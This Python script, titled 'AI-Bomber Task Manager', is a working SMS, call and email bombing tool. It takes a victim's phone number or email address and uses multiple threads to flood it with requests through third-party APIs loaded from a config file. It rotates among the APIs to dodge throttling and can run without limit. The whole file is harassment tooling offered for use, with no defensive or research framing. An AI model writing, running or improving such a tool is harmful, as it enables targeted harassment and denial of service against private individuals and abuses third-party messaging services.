import sys
import os
import json
import time
import random
import urllib.request
import urllib.error
import argparse
from concurrent.futures import ThreadPoolExecutor
import threading

# ANSI escape sequences for premium console styling
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

BANNER = f"""
{Colors.OKCYAN}{Colors.BOLD}======================================================================
    ___   ____     ____   ____   __  ___ ____   ______ ____ 
   /   | /  _/    / __ ) / __ \\\\ /  |/  // __ ) / ____// __ \\\\
  / /| | / /     / __  |/ / / // /|_/ // __  |/ __/  / /_/ /
 / ___ |/ /     / /_/ // /_/ // /  / // /_/ // /___ / _, _/ 
/_/  |_/___/   /_____/ \\\\____//_/  /_//_____//_____//_/ |_|  
                                                            
               AI-Bomber Task Manager & Runner v1.0
======================================================================{Colors.ENDC}
"""

def print_banner():
    print(BANNER)

def detect_target_type(target):
    if "@" in target:
        return "email"
    cleaned = "".join(filter(str.isdigit, target))
    if len(cleaned) >= 8:
        return "phone"
    return None

def load_apis(config_path, target_type, mode):
    if not os.path.exists(config_path):
        print(f"{Colors.FAIL}[ERROR] Configuration file api_config.json not found!{Colors.ENDC}")
        sys.exit(1)
        
    with open(config_path, "r", encoding="utf-8") as f:
        config = json.load(f)
        
    apis = []
    targets = config.get("targets", {})
    
    if target_type == "phone":
        phone_configs = targets.get("phone", {})
        if mode in ["sms", "all"]:
            apis.extend(phone_configs.get("sms", []))
        if mode in ["call", "all"]:
            apis.extend(phone_configs.get("call", []))
    elif target_type == "email":
        email_configs = targets.get("email", {})
        if mode in ["email", "all"]:
            apis.extend(email_configs.get("email", []))
            
    return apis

def send_request(api, target, stats, lock):
    name = api.get("name", "unknown")
    method = api.get("method", "GET").upper()
    url = api.get("url", "").replace("{target}", target)
    headers = api.get("headers", {})
    
    start_time = time.time()
    try:
        if method == "POST":
            body = api.get("body_template", {})
            rendered_body = {}
            if isinstance(body, dict):
                for k, v in body.items():
                    if isinstance(v, str):
                        rendered_body[k] = v.replace("{target}", target)
                    else:
                        rendered_body[k] = v
            else:
                rendered_body = body
                
            data = json.dumps(rendered_body).encode("utf-8")
            req = urllib.request.Request(url, data=data, method="POST")
        else:
            req = urllib.request.Request(url, method="GET")
            
        # Add headers
        for k, v in headers.items():
            req.add_header(k, v)
            
        # Execute request
        with urllib.request.urlopen(req, timeout=5) as response:
            status = response.getcode()
            success = 200 <= status < 300
            
    except urllib.error.HTTPError as e:
        status = e.code
        success = 200 <= status < 300
    except Exception as e:
        status = type(e).__name__
        success = False
        
    duration = time.time() - start_time
    
    with lock:
        stats["attempted"] += 1
        if success:
            stats["success"] += 1
            status_str = f"{Colors.OKGREEN}SUCCESS (Code: {status}){Colors.ENDC}"
        else:
            stats["failed"] += 1
            status_str = f"{Colors.FAIL}FAILED ({status}){Colors.ENDC}"
            
        category = "UNKNOWN"
        if "sms" in name:
            category = f"{Colors.OKCYAN}SMS{Colors.ENDC}"
        elif "call" in name:
            category = f"{Colors.WARNING}CALL{Colors.ENDC}"
        elif "email" in name:
            category = f"{Colors.OKBLUE}EMAIL{Colors.ENDC}"
            
        print(f"[{time.strftime('%H:%M:%S')}] [{category}] {name} -> {target} | {status_str} | {duration:.2f}s")

def worker(api_list, target, delay, stats, stop_event, lock, max_count):
    while not stop_event.is_set():
        with lock:
            if max_count > 0 and stats["attempted"] >= max_count:
                break
                
        # Select random API to prevent throttling on a single endpoint
        api = random.choice(api_list)
        send_request(api, target, stats, lock)
        
        # Sleep with periodic checks for stop event
        sleep_start = time.time()
        while time.time() - sleep_start < delay:
            if stop_event.is_set():
                break
            time.sleep(0.1)

def run_task(target, mode, count, delay, workers):
    target_type = detect_target_type(target)
    if not target_type:
        print(f"{Colors.FAIL}[ERROR] Invalid target format. Provide a valid email or phone number (digits only).{Colors.ENDC}")
        return
        
    config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "api_config.json")
    apis = load_apis(config_path, target_type, mode)
    
    if not apis:
        print(f"{Colors.WARNING}[WARNING] No APIs found matching target type '{target_type}' and mode '{mode}'{Colors.ENDC}")
        return
        
    print(f"\n{Colors.BOLD}{Colors.OKBLUE}>>> Starting Attack Task <<<{Colors.ENDC}")
    print(f"  Target:     {Colors.BOLD}{target}{Colors.ENDC}")
    print(f"  Type:       {Colors.BOLD}{target_type.upper()}{Colors.ENDC}")
    print(f"  Mode:       {Colors.BOLD}{mode.upper()}{Colors.ENDC}")
    print(f"  APIs loaded: {Colors.BOLD}{len(apis)}{Colors.ENDC}")
    print(f"  Workers:    {Colors.BOLD}{workers}{Colors.ENDC}")
    print(f"  Delay:      {Colors.BOLD}{delay}s{Colors.ENDC}")
    print(f"  Limit:      {Colors.BOLD}{count if count > 0 else 'Unlimited (Ctrl+C to stop)'}{Colors.ENDC}\n")
    print(f"Press {Colors.BOLD}{Colors.WARNING}Ctrl+C{Colors.ENDC} at any time to stop the task.\n")
    
    stats = {"attempted": 0, "success": 0, "failed": 0}
    lock = threading.Lock()
    stop_event = threading.Event()
    
    try:
        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [
                executor.submit(worker, apis, target, delay, stats, stop_event, lock, count)
                for _ in range(workers)
            ]
            
            # Wait for all threads to finish or monitor count
            while not stop_event.is_set():
                with lock:
                    if count > 0 and stats["attempted"] >= count:
                        stop_event.set()
                        break
                time.sleep(0.2)
                
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Stopping tasks... Please wait for threads to wind down.{Colors.ENDC}")
        stop_event.set()
        
    # Print stats summary
    print(f"\n{Colors.BOLD}================== SUMMARY =================={Colors.ENDC}")
    print(f"  Target:           {target}")
    print(f"  Total Attempted:  {stats['attempted']}")
    print(f"  Success:          {Colors.OKGREEN}{stats['success']}{Colors.ENDC}")
    print(f"  Failed:           {Colors.FAIL}{stats['failed']}{Colors.ENDC}")
    success_rate = (stats['success'] / stats['attempted'] * 100) if stats['attempted'] > 0 else 0
    print(f"  Success Rate:     {success_rate:.2f}%")
    print(f"{Colors.BOLD}============================================={Colors.ENDC}\n")

def main():
    # Setup windows color compatibility
    if sys.platform.startswith('win'):
        os.system('color')
        
    parser = argparse.ArgumentParser(description="AI-Bomber Task Manager")
    parser.add_argument("-t", "--target", help="Target phone number or email address")
    parser.add_argument("-m", "--mode", choices=["sms", "call", "email", "all"], help="Bombing mode (sms, call, email, all)")
    parser.add_argument("-c", "--count", type=int, default=0, help="Number of requests to send (default: unlimited)")
    parser.add_argument("-d", "--delay", type=float, default=1.0, help="Delay between requests in seconds (default: 1.0)")
    parser.add_argument("-w", "--workers", type=int, default=5, help="Number of concurrent worker threads (default: 5)")
    
    args = parser.parse_args()
    
    print_banner()
    
    if args.target:
        # Run directly from CLI args
        target = args.target
        target_type = detect_target_type(target)
        if not target_type:
            print(f"{Colors.FAIL}[ERROR] Invalid target. Use a phone number or email.{Colors.ENDC}")
            sys.exit(1)
            
        mode = args.mode if args.mode else ("all" if target_type == "phone" else "email")
        run_task(target, mode, args.count, args.delay, args.workers)
    else:
        # Interactive mode
        try:
            target = input(f"{Colors.OKCYAN}Enter target (Phone or Email): {Colors.ENDC}").strip()
            target_type = detect_target_type(target)
            
            while not target_type:
                print(f"{Colors.FAIL}Invalid target format.{Colors.ENDC}")
                target = input(f"{Colors.OKCYAN}Enter target (Phone or Email): {Colors.ENDC}").strip()
                target_type = detect_target_type(target)
                
            if target_type == "phone":
                print(f"\nSelect Mode for Phone:")
                print(f"  1. SMS (Default)")
                print(f"  2. CALL")
                print(f"  3. ALL (SMS & CALL)")
                choice = input(f"{Colors.OKCYAN}Choice [1-3]: {Colors.ENDC}").strip()
                if choice == "2":
                    mode = "call"
                elif choice == "3":
                    mode = "all"
                else:
                    mode = "sms"
            else:
                mode = "email"
                
            count_input = input(f"{Colors.OKCYAN}Number of requests (Enter for unlimited): {Colors.ENDC}").strip()
            count = int(count_input) if count_input.isdigit() else 0
            
            delay_input = input(f"{Colors.OKCYAN}Delay between requests (seconds, default 1.0): {Colors.ENDC}").strip()
            delay = float(delay_input) if delay_input else 1.0
            
            workers_input = input(f"{Colors.OKCYAN}Number of concurrent workers (default 5): {Colors.ENDC}").strip()
            workers = int(workers_input) if workers_input.isdigit() else 5
            
            run_task(target, mode, count, delay, workers)
            
        except (KeyboardInterrupt, EOFError):
            print(f"\n\n{Colors.WARNING}Exiting task manager. Goodbye!{Colors.ENDC}")

if __name__ == "__main__":
    main()
